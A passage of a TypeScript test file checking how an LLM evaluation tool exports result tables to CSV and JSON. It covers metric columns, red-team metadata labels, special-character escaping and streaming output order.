import { parse as parseCsv } from 'csv-parse/sync';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { ResultFailureReason } from '../../../src/types/index';
import {
  escapeCsvFormula,
  evalTableToCsv,
  evalTableToJson,
  generateEvalCsv,
  getEvalTableOutputPromptLocationsBySize,
  getEvalTablePromptStrippedPayload,
  STRIPPED_TABLE_CELL_PROMPT,
  streamEvalCsv,
} from '../../../src/util/eval/evalTableUtils';
import { createCompletedPrompt, createPromptMetrics } from '../../factories/eval';

import type Eval from '../../../src/models/eval';
import type {
  CompletedPrompt,
  EvaluateTableOutput,
  EvaluateTableRow,
  Prompt,
} from '../../../src/types/index';

type LegacyCompletedPrompt = Omit<CompletedPrompt, 'metrics'> & {
  metrics: Omit<NonNullable<CompletedPrompt['metrics']>, 'namedScoresCount'>;
};

const parseCSVLine = (line: string): string[] => {
  const result: string[] = [];
  let current = '';
  let inQuotes = false;

  for (let i = 0; i < line.length; i++) {
    const char = line[i];
    const nextChar = line[i + 1];

    if (char === '"' && nextChar === '"') {
      current += '"';
      i++;
    } else if (char === '"') {
      inQuotes = !inQuotes;
    } else if (char === ',' && !inQuotes) {
      result.push(current);
      current = '';
    } else {
      current += char;
    }
  }

  result.push(current);
  return result;
};

describe('evalTableUtils', () => {
  let mockTable: {
    head: { prompts: CompletedPrompt[]; vars: string[] };
    body: EvaluateTableRow[];
  };

  beforeEach(() => {
    mockTable = {
      head: {
        vars: ['var1', 'var2'],
        prompts: [
          createCompletedPrompt('Test prompt {{var1}}', {
            provider: 'openai:gpt-4',
            label: 'Prompt 1',
            display: 'Test prompt',
          }),
          createCompletedPrompt('Another prompt {{var2}}', {
            provider: 'anthropic:claude',
            label: 'Prompt 2',
            display: 'Another prompt',
          }),
        ],
      },
      body: [
        {
          test: {
            vars: { var1: 'value1', var2: 'value2' },
            description: 'Test case 1',
          },
          testIdx: 0,
          vars: ['value1', 'value2'],
          outputs: [
            {
              pass: true,
              text: 'Success output',
              gradingResult: {
                pass: true,
                reason: 'Output meets criteria',
                comment: 'Well formatted',
              },
            } as EvaluateTableOutput,
            {
              pass: false,
              text: 'Failed output',
              failureReason: ResultFailureReason.ASSERT,
              gradingResult: {
                pass: false,
                reason: 'Missing required field',
                comment: 'Needs improvement',
              },
            } as EvaluateTableOutput,
          ],
        },
        {
          test: {
            vars: { var1: 'value3', var2: 'value4' },
          },
          testIdx: 1,
          vars: ['value3', 'value4'],
          outputs: [
            {
              pass: false,
              text: 'Error output',
              failureReason: ResultFailureReason.ERROR,
              error: 'Network timeout',
            } as unknown as EvaluateTableOutput,
            {
              pass: true,
              text: 'Another success',
            } as EvaluateTableOutput,
          ],
        },
      ],
    };
  });

  describe('evalTableToCsv', () => {
    describe('Basic CSV generation', () => {
      it('should generate CSV with headers and data', () => {
        const csv = evalTableToCsv(mockTable);
        const lines = csv.split('\n');

        expect(lines[0]).toContain('Description');
        expect(lines[0]).toContain('var1');
        expect(lines[0]).toContain('var2');
        expect(lines[0]).toContain('[openai:gpt-4] Prompt 1');
        expect(lines[0]).toContain('[anthropic:claude] Prompt 2');
        expect(lines[0]).toContain('Status');
        expect(lines[0]).toContain('Score');
        expect(lines[0]).toContain('Named Scores');
        expect(lines[0]).toContain('Grader Reason');
        expect(lines[0]).toContain('Comment');
      });

      it('should include test descriptions when present', () => {
        const csv = evalTableToCsv(mockTable);
        const lines = csv.split('\n');

        expect(lines[1]).toContain('Test case 1');
        // Second row should not have a description (empty string)
        const row2Parts = lines[2].split(',');
        expect(row2Parts[0]).toBe(''); // Empty description for second test
      });

      it('should exclude Description column when no descriptions exist', () => {
        const tableWithoutDescriptions = {
          ...mockTable,
          body: mockTable.body.map((row) => ({
            ...row,
            test: { ...row.test, description: undefined },
          })),
        };

        const csv = evalTableToCsv(tableWithoutDescriptions);
        const lines = csv.split('\n');

        expect(lines[0]).not.toContain('Description');
        expect(lines[0].startsWith('var1')).toBe(true);
      });

      it('should format output with separate status column', () => {
        const csv = evalTableToCsv(mockTable);
        const lines = csv.split('\n');

        // Output text should be clean (no prefix)
        expect(lines[1]).toContain('Success output');
        expect(lines[1]).toContain('Failed output');
        expect(lines[2]).toContain('Error output');
        expect(lines[2]).toContain('Another success');

        // Status should be in separate columns
        expect(lines[1]).toContain('PASS');
        expect(lines[1]).toContain('FAIL');
        expect(lines[2]).toContain('ERROR');
      });

      it('should include grader reason and comments', () => {
        const csv = evalTableToCsv(mockTable);
        const lines = csv.split('\n');

        expect(lines[1]).toContain('Output meets criteria');
        expect(lines[1]).toContain('Well formatted');
        expect(lines[1]).toContain('Missing required field');
        expect(lines[1]).toContain('Needs improvement');
      });

      it('should include named scores as JSON', () => {
        const tableWithNamedScores = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output with named scores',
                  score: 0.85,
                  namedScores: {
                    clarity: 0.9,
                    accuracy: 0.8,
                    relevance: 0.85,
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithNamedScores);
        const lines = csv.split('\n');

        // Named scores should be JSON formatted
        expect(lines[1]).toContain('clarity');
        expect(lines[1]).toContain('accuracy');
        expect(lines[1]).toContain('relevance');
        expect(lines[1]).toContain('0.9');
        expect(lines[1]).toContain('0.8');
        expect(lines[1]).toContain('0.85');
      });

      it('should add dedicated metric columns for named scores', () => {
        const tableWithNamedScores = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'First scored output',
                  score: 0.85,
                  namedScores: {
                    clarity: 0.9,
                    accuracy: 0.8,
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
            {
              ...mockTable.body[1],
              outputs: [
                {
                  pass: true,
                  text: 'Second scored output',
                  score: 0.75,
                  namedScores: {
                    clarity: 0.7,
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithNamedScores);
        const lines = csv.split('\n');

        expect(lines[0]).toContain('Metric: accuracy');
        expect(lines[0]).toContain('Metric: clarity');
        expect(lines[1]).toContain('0.80,0.90');
        expect(lines[2]).toContain(',0.70');
      });

      it('should handle empty named scores', () => {
        const tableWithEmptyNamedScores = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output without named scores',
                  score: 1.0,
                  namedScores: {},
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithEmptyNamedScores);
        const lines = csv.split('\n');

        // Empty named scores should result in empty string, not '{}'
        expect(lines[1]).toContain('Output without named scores');
        expect(lines[1]).not.toContain('{}');
      });

      it('should leave dedicated metric cells empty for null outputs in a multi-prompt table', () => {
        // When one output is null, the corresponding prompt block must still
        // emit the right number of placeholder cells (label, status, score,
        // namedScores, N metric columns, grader reason, comment). If the math
        // is wrong, downstream columns (including the next prompt's label)
        // shift and the CSV becomes unparseable.
        const tableWithMixedOutputs = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                null,
                {
                  pass: true,
                  text: 'Second output',
                  score: 0.9,
                  namedScores: { clarity: 0.9, accuracy: 0.8 },
                } as unknown as EvaluateTableOutput,
              ] as EvaluateTableOutput[],
            },
          ],
        };

        const [headerCols, rowCols] = parseCsv(evalTableToCsv(tableWithMixedOutputs)) as string[][];
        expect(rowCols).toHaveLength(headerCols.length);

        // The null prompt block has no metric columns (its row contributes no
        // named scores). The populated prompt block has both metrics.
        expect(headerCols).toContain('Metric: clarity');
        expect(headerCols).toContain('Metric: accuracy');
        const clarityIdx = headerCols.indexOf('Metric: clarity');
        const accuracyIdx = headerCols.indexOf('Metric: accuracy');
        expect(rowCols[clarityIdx]).toBe('0.90');
        expect(rowCols[accuracyIdx]).toBe('0.80');
      });

      it('should handle null and undefined outputs', () => {
        const tableWithNullOutputs = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                null,
                undefined,
                { pass: true, text: 'Valid output' } as EvaluateTableOutput,
              ] as EvaluateTableOutput[],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithNullOutputs);
        const lines = csv.split('\n');

        // Should have empty values for null/undefined outputs (6 empty columns per null output)
        expect(lines[1]).toContain(',,,,,,'); // Empty values for null output
        expect(lines[1]).toContain('Valid output');
        expect(lines[1]).toContain('PASS');
      });

      it('should handle outputs without gradingResult', () => {
        const tableWithoutGrading = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output without grading',
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithoutGrading);
        const lines = csv.split('\n');

        // Should have output, status, score (empty), and empty grader columns
        expect(lines[1]).toContain('Output without grading');
        expect(lines[1]).toContain('PASS');
        // Empty score and grader columns at the end
        expect(lines[1]).toMatch(/PASS,.*,,$/);
      });
    });

    describe('Red team CSV generation', () => {
      it('should add Messages column for message-based providers', () => {
        const tableWithMessages = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output',
                  metadata: {
                    messages: [
                      { role: 'user', content: 'Hello' },
                      { role: 'assistant', content: 'Hi there!' },
                    ],
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithMessages, { isRedteam: true });
        const lines = csv.split('\n');

        expect(lines[0]).toContain('Messages');
        // CSV escapes quotes in JSON strings
        expect(lines[1]).toMatch(
          /\[.*role.*user.*content.*Hello.*\}.*\{.*role.*assistant.*content.*Hi there.*\]/,
        );
      });

      it('should add RedteamHistory column for iterative providers', () => {
        const tableWithHistory = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: false,
                  text: 'Output',
                  metadata: {
                    redteamHistory: [
                      'Initial attempt',
                      'Second attempt with modification',
                      'Final successful attempt',
                    ],
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithHistory, { isRedteam: true });
        const lines = csv.split('\n');

        expect(lines[0]).toContain('RedteamHistory');
        // CSV escapes quotes in JSON strings
        expect(lines[1]).toMatch(
          /Initial attempt.*Second attempt with modification.*Final successful attempt/,
        );
      });

      it('should add RedteamTreeHistory column for tree-based providers', () => {
        const tableWithTreeHistory = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: false,
                  text: 'Output',
                  metadata: {
                    redteamTreeHistory: 'Root -> Branch1 -> Leaf1\nRoot -> Branch2 -> Leaf2',
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithTreeHistory, { isRedteam: true });
        const lines = csv.split('\n');

        expect(lines[0]).toContain('RedteamTreeHistory');
        // Tree history is a string primitive, so it's added directly (not JSON.stringify'd)
        expect(lines[1]).toMatch(/Root -> Branch1 -> Leaf1/);
        expect(csv).toMatch(/Root -> Branch2 -> Leaf2/);
      });

      it('should add pluginId, strategyId, sessionId, and sessionIds columns', () => {
        const tableWithIds = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: false,
                  text: 'Output',
                  metadata: {
                    pluginId: 'harmful:violent-crime',
                    strategyId: 'jailbreak',
                    sessionId: 'session-abc-123',
                    sessionIds: ['session-abc-123', 'session-def-456'],
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithIds, { isRedteam: true });
        const lines = csv.split('\n');

        expect(lines[0]).toContain('pluginId');
        expect(lines[0]).toContain('strategyId');
        expect(lines[0]).toContain('sessionId');
        expect(lines[0]).toContain('sessionIds');
        // String primitives are added directly (not JSON.stringify'd)
        expect(lines[1]).toContain('harmful:violent-crime');
        expect(lines[1]).toContain('jailbreak');
        expect(lines[1]).toContain('session-abc-123');
        // sessionIds is an array, should be JSON stringified (CSV escapes quotes as double quotes)
        expect(lines[1]).toMatch(/session-abc-123.*session-def-456/);
      });

      it('should include all red team columns when multiple metadata types exist', () => {
        const tableWithAllMetadata = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output 1',
                  metadata: {
                    messages: [{ role: 'user', content: 'Test' }],
                    redteamHistory: ['Attempt 1'],
                    redteamTreeHistory: 'Tree structure',
                    pluginId: 'test-plugin',
                    strategyId: 'test-strategy',
                    sessionId: 'session-123',
                    sessionIds: ['session-123', 'session-456'],
                  },
                } as unknown as EvaluateTableOutput,
                {
                  pass: false,
                  text: 'Output 2',
                  metadata: {
                    messages: [{ role: 'assistant', content: 'Response' }],
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithAllMetadata, { isRedteam: true });
        const lines = csv.split('\n');

        expect(lines[0]).toContain('Messages');
        expect(lines[0]).toContain('RedteamHistory');
        expect(lines[0]).toContain('RedteamTreeHistory');
        expect(lines[0]).toContain('pluginId');
        expect(lines[0]).toContain('strategyId');
        expect(lines[0]).toContain('sessionId');
        expect(lines[0]).toContain('sessionIds');
      });

      it('should handle multiple outputs without redteam metadata', () => {
        const tableWithMultipleOutputs = {
          head: {
            vars: ['var1'],
            prompts: [
              createCompletedPrompt('Test prompt 1', {
                provider: 'openai:gpt-4',
                label: 'Prompt 1',
                display: 'Test prompt 1',
              }),
              createCompletedPrompt('Test prompt 2', {
                provider: 'anthropic:claude',
                label: 'Prompt 2',
                display: 'Test prompt 2',
              }),
            ],
          },
          body: [
            {
              test: {
                vars: { var1: 'value1' },
              },
              testIdx: 0,
              vars: ['value1'],
              outputs: [
                {
                  pass: true,
                  text: 'First output',
                  gradingResult: {
                    pass: true,
                    reason: 'Good response',
                    comment: 'Well formatted',
                  },
                } as unknown as EvaluateTableOutput,
                {
                  pass: false,
                  text: 'Second output',
                  failureReason: ResultFailureReason.ASSERT,
                  gradingResult: {
                    pass: false,
                    reason: 'Bad response',
                    comment: 'Needs work',
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithMultipleOutputs); // No isRedteam flag
        const lines = csv.split('\n').filter((line: string) => line.trim());

        const headerCols = parseCSVLine(lines[0]);
        const dataCols = parseCSVLine(lines[1]);

        // Header and data row should have the same number of columns
        expect(headerCols.length).toBe(dataCols.length);

        // Verify no redteam columns are present
        expect(lines[0]).not.toContain('Messages');
        expect(lines[0]).not.toContain('pluginId');
        expect(lines[0]).not.toContain('strategyId');

        // Both outputs should be present
        expect(lines[1]).toContain('First output');
        expect(lines[1]).toContain('Second output');
        expect(lines[1]).toContain('Good response');
        expect(lines[1]).toContain('Bad response');
      });

      it('should add redteam metadata columns once per row with multiple outputs', () => {
        const tableWithMultipleOutputs = {
          head: {
            vars: ['var1'],
            prompts: [
              createCompletedPrompt('Test prompt 1', {
                provider: 'openai:gpt-4',
                label: 'Prompt 1',
                display: 'Test prompt 1',
              }),
              createCompletedPrompt('Test prompt 2', {
                provider: 'anthropic:claude',
                label: 'Prompt 2',
                display: 'Test prompt 2',
              }),
            ],
          },
          body: [
            {
              test: {
                vars: { var1: 'value1' },
              },
              testIdx: 0,
              vars: ['value1'],
              outputs: [
                {
                  pass: true,
                  text: 'First output',
                  metadata: {
                    messages: [{ role: 'user', content: 'First message' }],
                    pluginId: 'plugin-1',
                    strategyId: 'strategy-1',
                    sessionId: 'session-1',
                  },
                } as unknown as EvaluateTableOutput,
                {
                  pass: false,
                  text: 'Second output',
                  metadata: {
                    messages: [{ role: 'assistant', content: 'Second message' }],
                    pluginId: 'plugin-2',
                    strategyId: 'strategy-2',
                    sessionId: 'session-2',
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithMultipleOutputs, { isRedteam: true });
        const lines = csv.split('\n').filter((line: string) => line.trim());

        const headerCols = parseCSVLine(lines[0]);
        const dataCols = parseCSVLine(lines[1]);

        // Header and data row should have the same number of columns
        expect(headerCols.length).toBe(dataCols.length);

        // Verify redteam columns are present in header (added once, not per output)
        expect(lines[0]).toContain('Messages');
        expect(lines[0]).toContain('pluginId');
        expect(lines[0]).toContain('strategyId');
        expect(lines[0]).toContain('sessionId');

        // Should use first output's metadata
        expect(lines[1]).toContain('First output');
        expect(lines[1]).toContain('Second output');
        expect(lines[1]).toContain('plugin-1'); // From first output
        expect(lines[1]).not.toContain('plugin-2'); // Second output's metadata should not be included
      });

      it('should not add red team columns when config.redteam is not present', () => {
        const tableWithMetadata = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output',
                  metadata: {
                    messages: [{ role: 'user', content: 'Test' }],
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithMetadata); // No config
        const lines = csv.split('\n');

        expect(lines[0]).not.toContain('Messages');
        expect(lines[0]).not.toContain('RedteamHistory');
        expect(lines[0]).not.toContain('RedteamTreeHistory');
      });

      it('should handle empty metadata arrays gracefully', () => {
        const tableWithEmptyMetadata = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output',
                  metadata: {
                    messages: [],
                    redteamHistory: [],
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithEmptyMetadata, { isRedteam: true });
        const lines = csv.split('\n');

        // Empty arrays are still JSON.stringify'd (they're objects, not primitives)
        expect(lines[1]).toContain('[]');
      });

      it('should handle null/undefined metadata fields', () => {
        const tableWithNullMetadata = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output',
                  metadata: {
                    messages: null,
                    redteamHistory: undefined,
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithNullMetadata, { isRedteam: true });
        const lines = csv.split('\n');

        // When metadata fields are null/undefined, they should be empty strings in CSV
        if (lines[0].includes('Messages') || lines[0].includes('RedteamHistory')) {
          // The data row should have empty values for the redteam columns (trailing commas)
          expect(lines[1]).toMatch(/,,$/);
        } else {
          // If no redteam columns were added, check that the line ends appropriately
          expect(lines[1]).toBeDefined();
        }
      });

      it('should include pluginId and strategyId from metadata in CSV output', () => {
        // This test validates that pluginId and strategyId are read from metadata
        // for CSV export, consistent with the promptfoo-cloud approach
        const outputWithMetadataIds: EvaluateTableOutput = {
          id: 'test-id',
          pass: true,
          text: 'Test output',
          prompt: 'Test prompt',
          score: 1,
          cost: 0,
          latencyMs: 100,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          testCase: { vars: {} },
          metadata: {
            pluginId: 'harmful:violent-crime',
            strategyId: 'jailbreak',
          },
        };

        // Verify the fields are accessible via metadata
        expect(outputWithMetadataIds.metadata?.pluginId).toBe('harmful:violent-crime');
        expect(outputWithMetadataIds.metadata?.strategyId).toBe('jailbreak');

        // Verify the output can be used in a table
        const tableWithMetadataIds = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [outputWithMetadataIds],
            },
          ],
        };

        // Should not throw when generating CSV
        const csv = evalTableToCsv(tableWithMetadataIds, { isRedteam: true });
        expect(csv).toBeDefined();
        expect(csv.length).toBeGreaterThan(0);

        // Verify metadata fields appear in CSV output
        const lines = csv.split('\n');
        expect(lines[0]).toContain('pluginId');
        expect(lines[0]).toContain('strategyId');
        expect(lines[1]).toContain('harmful:violent-crime');
        expect(lines[1]).toContain('jailbreak');
      });

      it('should default strategyId to "basic" for strategy-less tests', () => {
        // This test validates that when strategyId is missing from metadata,
        // the CSV export defaults to 'basic'
        const outputWithoutStrategy: EvaluateTableOutput = {
          id: 'test-id',
          pass: true,
          text: 'Test output',
          prompt: 'Test prompt',
          score: 1,
          cost: 0,
          latencyMs: 100,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          testCase: { vars: {} },
          metadata: {
            pluginId: 'harmful:violent-crime',
            // strategyId intentionally omitted
          },
        };

        const tableWithoutStrategy = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [outputWithoutStrategy],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithoutStrategy, { isRedteam: true });
        const lines = csv.split('\n');

        // Verify strategyId defaults to 'basic'
        expect(lines[1]).toContain('basic');
      });
    });

    describe('Edge cases and special characters', () => {
      it('should handle special characters in text fields', () => {
        const tableWithSpecialChars = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              test: {
                vars: {},
                description: 'Description with "quotes", commas, and\nnewlines',
              },
              vars: ['Value with, comma', 'Value with "quotes"'],
              outputs: [
                {
                  pass: true,
                  text: 'Output with\nnewline and "quotes"',
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithSpecialChars);

        // CSV should properly escape special characters
        expect(csv).toContain('"Description with ""quotes"", commas, and\nnewlines"');
        expect(csv).toContain('"Value with, comma"');
        expect(csv).toContain('"Value with ""quotes"""');
      });

      it('should handle Unicode characters', () => {
        const tableWithUnicode = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              test: {
                vars: {},
                description: 'Test with émojis 🎉 and Unicode: 你好世界',
              },
              vars: ['日本語', '한국어'],
              outputs: [
                {
                  pass: true,
                  text: 'Output with symbols: ™️ © ® ≠ ∞',
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithUnicode);

        expect(csv).toContain('Test with émojis 🎉 and Unicode: 你好世界');
        expect(csv).toContain('日本語');
        expect(csv).toContain('한국어');
        expect(csv).toContain('Output with symbols: ™️ © ® ≠ ∞');
      });

      it('should handle very long text fields', () => {
        const longText = 'a'.repeat(10000);
        const tableWithLongText = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              test: {
                vars: {},
                description: longText,
              },
              outputs: [
                {
                  pass: true,
                  text: longText,
                  gradingResult: {
                    pass: true,
                    reason: longText,
                    comment: longText,
                  },
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithLongText);

        // Should contain the long text (CSV format handles it)
        expect(csv).toContain(longText);
      });

      it('should handle empty table body', () => {
        const emptyTable = {
          ...mockTable,
          body: [],
        };

        const csv = evalTableToCsv(emptyTable);
        const lines = csv.split('\n').filter((line: string) => line.trim());

        // Should only have header row
        expect(lines).toHaveLength(1);
        expect(lines[0]).toContain('var1');
      });

      it('should handle table with no prompts', () => {
        const tableWithNoPrompts = {
          head: {
            vars: ['var1', 'var2'],
            prompts: [],
          },
          body: [
            {
              test: { vars: {} },
              testIdx: 0,
              vars: ['value1', 'value2'],
              outputs: [],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithNoPrompts);
        const lines = csv.split('\n');

        // Should only have variable columns
        expect(lines[0]).toBe('var1,var2');
        expect(lines[1]).toBe('value1,value2');
      });

      it('should handle complex nested JSON in metadata', () => {
        const complexMetadata = {
          messages: [
            {
              role: 'user',
              content: 'Complex message',
              metadata: {
                timestamp: '2024-01-01T00:00:00Z',
                tags: ['tag1', 'tag2'],
                nested: {
                  deep: {
                    value: 'nested value',
                  },
                },
              },
            },
          ],
          redteamHistory: [
            {
              attempt: 1,
              success: false,
              details: {
                strategy: 'jailbreak',
                prompt: 'Test prompt',
              },
            },
          ],
        };

        const tableWithComplexMetadata = {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                {
                  pass: true,
                  text: 'Output',
                  metadata: complexMetadata,
                } as unknown as EvaluateTableOutput,
              ],
            },
          ],
        };

        const csv = evalTableToCsv(tableWithComplexMetadata, {
          isRedteam: true,
        });

        // Should serialize complex objects as JSON strings (with CSV escaping)
        expect(csv).toMatch(/Complex message/);
        expect(csv).toMatch(/timestamp.*2024-01-01T00:00:00Z/);
        expect(csv).toMatch(/tags.*tag1.*tag2/);
        // Note: When messages are present, redteamHistory is not included in its own column
        // The redteamHistory data would be empty since messages take precedence
      });
    });
  });

  describe('table prompt stripping helpers', () => {
    it('should strip prompts from largest to smallest by requested count', () => {
      const payload = {
        table: {
          ...mockTable,
          body: [
            {
              ...mockTable.body[0],
              outputs: [
                { ...mockTable.body[0].outputs[0], prompt: 'short prompt' },
                { ...mockTable.body[0].outputs[1], prompt: 'very long prompt' },
              ],
            },
          ],
        },
        totalCount: 1,
        filteredCount: 1,
        filteredMetrics: null,
        config: {},
        author: null,
        version: 4,
        id: 'eval-id',
      };

      const promptLocations = getEvalTableOutputPromptLocationsBySize(payload);

      expect(promptLocations).toHaveLength(2);

      const firstFallback = getEvalTablePromptStrippedPayload(payload, promptLocations, 1);
      const secondFallback = getEvalTablePromptStrippedPayload(payload, promptLocations, 2);

      expect(firstFallback.table.body[0].outputs[0].prompt).toBe('short prompt');
      expect(firstFallback.table.body[0].outputs[1].prompt).toBe(STRIPPED_TABLE_CELL_PROMPT);
      expect(secondFallback.table.body[0].outputs[0].prompt).toBe(STRIPPED_TABLE_CELL_PROMPT);
      expect(secondFallback.table.body[0].outputs[1].prompt).toBe(STRIPPED_TABLE_CELL_PROMPT);
      expect(JSON.stringify(firstFallback).length).toBeLessThan(JSON.stringify(payload).length);
      expect(JSON.stringify(secondFallback).length).toBeLessThan(
        JSON.stringify(firstFallback).length,
      );
    });
  });

  describe('evalTableToJson', () => {
    it('should return the table as-is', () => {
      const result = evalTableToJson(mockTable);
      expect(result).toBe(mockTable);
    });

    it('should handle empty table', () => {
      const emptyTable = {
        head: { vars: [], prompts: [] },
        body: [],
      };
      const result = evalTableToJson(emptyTable);
      expect(result).toBe(emptyTable);
    });

    it('should preserve all data including metadata', () => {
      const tableWithMetadata = {
        ...mockTable,
        body: [
          {
            ...mockTable.body[0],
            outputs: [
              {
                pass: true,
                text: 'Output',
                metadata: {
                  custom: 'data',
                  nested: { value: 123 },
                },
              } as unknown as EvaluateTableOutput,
            ],
          },
        ],
      };

      const result = evalTableToJson(tableWithMetadata);
      expect(result).toBe(tableWithMetadata);
      expect(
        (result as { body: Array<{ outputs: Array<{ metadata: unknown }> }> }).body[0].outputs[0]
          .metadata,
      ).toEqual({
        custom: 'data',
        nested: { value: 123 },
      });
    });
  });

  // Build a CompletedPrompt that mimics legacy/imported persistence: the
  // `metrics` object exists but lacks `namedScoresCount`. The streaming CSV
  // path must fall back to a row-scan discovery pass for these prompts.
  // `overrides.namedScores` contains aggregate prompt-level metrics; per-row
  // named scores remain on the individual result rows.
  function createLegacyCompletedPrompt(
    raw: string,
    overrides: { namedScores: Record<string, number> } & Partial<Omit<CompletedPrompt, 'metrics'>>,
  ): LegacyCompletedPrompt {
    const { namedScores, ...rest } = overrides;
    const prompt = createCompletedPrompt(raw, rest);
    const { namedScoresCount: _namedScoresCount, ...legacyMetrics } = createPromptMetrics({
      namedScores,
    });
    return {
      ...prompt,
      metrics: legacyMetrics,
    };
  }

  describe('streamEvalCsv', () => {
    it('should order outputs by promptIdx regardless of database return order', async () => {
      // Simulate results coming back in non-sequential order (prompt 2, then 0, then 1)
      const mockResults = [
        {
          testIdx: 0,
          promptIdx: 2, // Third prompt, but returned first
          testCase: { vars: { name: 'Alice' }, description: 'Test 1' },
          response: { output: 'Third output' },
          success: true,
          score: 1,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          gradingResult: null,
          metadata: {},
        },
        {
          testIdx: 0,
          promptIdx: 0, // First prompt, returned second
          testCase: { vars: { name: 'Alice' }, description: 'Test 1' },
          response: { output: 'First output' },
          success: true,
          score: 1,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          gradingResult: null,
          metadata: {},
        },
        {
          testIdx: 0,
          promptIdx: 1, // Second prompt, returned third
          testCase: { vars: { name: 'Alice' }, description: 'Test 1' },
          response: { output: 'Second output' },
          success: true,
          score: 1,
          namedScores: {},
          failureReason: ResultFailureReason.NONE,
          gradingResult: null,
          metadata: {},
        },
      ];

      const mockEval = {
        vars: ['name'],
        prompts: [
          { label: 'Prompt 1' } as Prompt,
          { label: 'Prompt 2' } as Prompt,
          { label: 'Prompt 3' } as Prompt,
        ],
        fetchResultsBatched: async function* () {
          yield mockResults;
        },
      } as unknown as Eval;

      const chunks: string[] = [];
      await streamEvalCsv(mockEval, {
        isRedteam: false,
        write: (data: string) => {
          chunks.push(data);
        },
      });

      const csv = chunks.join('');
      const lines = csv.split('\n').filter((line) => line.trim());

      // Header should have prompts in order
      expect(lines[0]).toContain('Prompt 1');
      expect(lines[0]).toContain('Prompt 2');
      expect(lines[0]).toContain('Prompt 3');

      // Data row should have outputs in correct column order
      // (First output under Prompt 1, Second under Prompt 2, Third under Prompt 3)
      expect(lines[1]).toContain('First output');
      expect(lines[1]).toContain('Second output');
      expect(lines[1]).toContain('Third output');

      // Verify order: First should come before Second, Second before Third
      const firstIdx = lines[1].indexOf('First output');
      const secondIdx = lines[1].indexOf('Second output');
      const thirdIdx = lines[1].indexOf('Third output');
      expect(firstIdx).toBeLessThan(secondIdx);
      expect(secondIdx).toBeLessThan(thirdIdx);
    });

    async function runStreamEvalCsv({
      vars,
      prompts,
      results,
      isRedteam = false,
    }: {
      vars: string[];
      prompts: Array<CompletedPrompt | LegacyCompletedPrompt>;
      results: unknown[];
      isRedteam?: boolean;
    }): Promise<string> {
      const chunks: string[] = [];
      await streamEvalCsv(
        {
          vars,
          prompts,
          fetchResultsBatched: async function* () {
            yield results;
          },
        } as unknown as Eval,
        {
          isRedteam,
          write: (data: string) => {
            chunks.push(data);
          },
        },
      );
      return chunks.join('');
    }

    it('should include dedicated metric columns when streaming CSV', async () => {
      const csv = await runStreamEvalCsv({
        vars: ['name'],
